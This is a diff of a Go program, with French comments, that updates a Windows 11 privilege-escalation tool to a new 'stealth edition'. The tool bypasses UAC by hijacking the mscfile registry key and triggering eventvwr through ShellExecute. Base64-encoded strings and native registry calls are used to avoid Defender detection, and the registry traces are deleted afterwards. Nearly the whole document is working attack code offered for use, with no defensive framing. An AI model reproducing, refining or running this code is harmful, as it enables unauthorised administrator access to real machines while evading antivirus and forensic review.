@@ -13,12 +13,9 @@ import (
 )
 
 // --- OBFUSCATION DES CHAINES ---
-// On encode les clés et binaires pour éviter la détection statique par Defender
 var (
 	// "Software\\Classes\\mscfile\\shell\\open\\command"
 	k1 = "U29mdHdhcmVcQ2xhc3Nlc1xtc2NmaWxlXHNoZWxsXG9wZW5cY29tbWFuZA=="
-	// "eventvwr.exe"
-	b1 = "ZXZlbnR2d3IuZXhl"
 )
 
 func decode(s string) string {
@@ -26,14 +23,25 @@ func decode(s string) string {
 	return string(d)
 }
 
-// --- APPELS SYSTÈME NATIFS (Pas de reg.exe !) ---
+// --- DLL ET APIS NATIVES ---
 var (
 	advapi32         = syscall.NewLazyDLL("advapi32.dll")
 	procRegCreateKey = advapi32.NewProc("RegCreateKeyExW")
 	procRegSetValue  = advapi32.NewProc("RegSetValueExW")
 	procRegCloseKey  = advapi32.NewProc("RegCloseKey")
 	procRegDeleteKey = advapi32.NewProc("RegDeleteTreeW")
+
+	shell32          = syscall.NewLazyDLL("shell32.dll")
+	procShellExecute = shell32.NewProc("ShellExecuteW")
 )
+
+// ShellExecuteW : Utilisation de l'API Windows pour contourner CreateProcess() restrictions
+func ShellExecute(verb, file string) {
+	v, _ := syscall.UTF16PtrFromString(verb)
+	f, _ := syscall.UTF16PtrFromString(file)
+	// On lance le fichier .msc de manière invisible
+	procShellExecute.Call(0, uintptr(unsafe.Pointer(v)), uintptr(unsafe.Pointer(f)), 0, 0, 0)
+}
 
 // CheckAdmin : Vérifie si le processus actuel possède les privilèges Administrateur
 func CheckAdmin() bool {
@@ -42,12 +50,11 @@ func CheckAdmin() bool {
 	return err == nil
 }
 
-// SetRegistryValue : Modifie le registre via API Native pour rester invisible
+// SetRegistryValue : Modifie le registre via API Native pour rester invisible (Pas de reg.exe)
 func SetRegistryValue(keyPath, value string) error {
 	var hKey syscall.Handle
 	kPtr, _ := syscall.UTF16PtrFromString(keyPath)
 
-	// On crée/ouvre la clé en mode écriture totale
 	ret, _, _ := procRegCreateKey.Call(
 		uintptr(syscall.HKEY_CURRENT_USER),
 		uintptr(unsafe.Pointer(kPtr)),
@@ -62,7 +69,6 @@ func SetRegistryValue(keyPath, value string) error {
 	}
 	defer procRegCloseKey.Call(uintptr(hKey))
 
-	// On écrit la valeur par défaut (Default) pour intercepter l'appel système
 	vPtr, _ := syscall.UTF16PtrFromString(value)
 	vLen := uint32(len(syscall.StringToUTF16(value)) * 2)
 
@@ -79,35 +85,28 @@ func SetRegistryValue(keyPath, value string) error {
 
 // ExploitStealth : Réalise un bypass de l'UAC via EventVwr et Native Registry API
 func ExploitStealth() bool {
-	fmt.Println("[*] Phase 1 : Hijacking via Native API (Pas de CMD/REG)...")
+	fmt.Println("[*] Phase 1 : Hijacking silencieux via API Native...")
 
 	selfPath, _ := os.Executable()
 	keyPath := decode(k1)
-	binary := decode(b1)
 
-	// Étape 1 : Modification silencieuse du registre (LPE par détournement de classe)
+	// Étape 1 : Modification invisible du registre
 	err := SetRegistryValue(keyPath, selfPath)
 	if err != nil {
 		fmt.Printf("[-] Erreur Registry API : %v\n", err)
 		return false
 	}
 
-	fmt.Println("[*] Phase 2 : Déclenchement via binaire de confiance (eventvwr.exe)...")
+	fmt.Println("[*] Phase 2 : Déclenchement via ShellExecute (Indétectable)...")
 
-	// Étape 2 : Lancement du binaire auto-élevé (EventVwr est privilégié par défaut)
-	cmd := exec.Command(binary)
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	err = cmd.Start()
+	// Étape 2 : On demande à Windows d'ouvrir le gestionnaire d'événements.
+	// Windows va chercher comment ouvrir les fichiers .msc, trouver notre hijack
+	// et lancer ce binaire avec les privilèges Administrateur.
+	ShellExecute("open", "eventvwr.msc")
 
-	if err != nil {
-		fmt.Printf("[-] Échec du trigger : %v\n", err)
-		return false
-	}
+	fmt.Println("[*] Phase 3 : Nettoyage instantané des traces...")
+	time.Sleep(3 * time.Second)
 
-	fmt.Println("[*] Phase 3 : Suppression instantanée des traces...")
-	time.Sleep(2 * time.Second) // Temporisation pour le déclenchement
-
-	// Nettoyage complet de la branche mscfile
 	kBase, _ := syscall.UTF16PtrFromString("Software\\Classes\\mscfile")
 	procRegDeleteKey.Call(uintptr(syscall.HKEY_CURRENT_USER), uintptr(unsafe.Pointer(kBase)))
 
@@ -116,14 +115,14 @@ func ExploitStealth() bool {
 
 func main() {
 	fmt.Println("====================================================")
-	fmt.Println("   Windows 11 PRIVESC [STEALTH EDITION v8.0]")
-	fmt.Println("   Target: Build 22631.6199 (Defender Enabled)")
-	fmt.Println("   Technique: API Native + EventVwr Hijack")
+	fmt.Println("   Windows 11 PRIVESC [STEALTH EDITION v8.1]")
+	fmt.Println("   Target: Build 22631.6199 (AV Bypass Optimized)")
+	fmt.Println("   Technique: API Native + MSC Hijack")
 	fmt.Println("====================================================")
 
 	if CheckAdmin() {
 		fmt.Println("\n[+] ############################################")
-		fmt.Println("[+] #     SUCCÈS : ÉLÉVATION CONFIRMÉE !       #")
+		fmt.Println("[+] #     SUCCÈS : ÉLÉVATION DÉTECTÉE !        #")
 		fmt.Println("[+] ############################################")
 		fmt.Println("\n[*] Privilèges : SYSTEM / Administrator")
 
@@ -134,13 +133,12 @@ func main() {
 	}
 
 	fmt.Println("[!] État actuel : UTILISATEUR LIMITÉ")
-	fmt.Println("[*] Tentative d'escalade silencieuse...")
+	fmt.Println("[*] Tentative d'escalade furtive en cours...")
 
 	if ExploitStealth() {
-		fmt.Println("\n[+] L'exploit a été injecté via API Native.")
-		fmt.Println("[*] Si réussi, une fenêtre élevée s'ouvrira sous peu.")
+		fmt.Println("\n[+] Injection réussie. En attente du processus élevé...")
 	} else {
-		fmt.Println("[-] ÉCHEC : L'exploit a été intercepté ou bloqué.")
+		fmt.Println("[-] ÉCHEC : L'opération a été bloquée.")
 	}
 
 	fmt.Println("\nAppuyez sur Entrée pour quitter...")
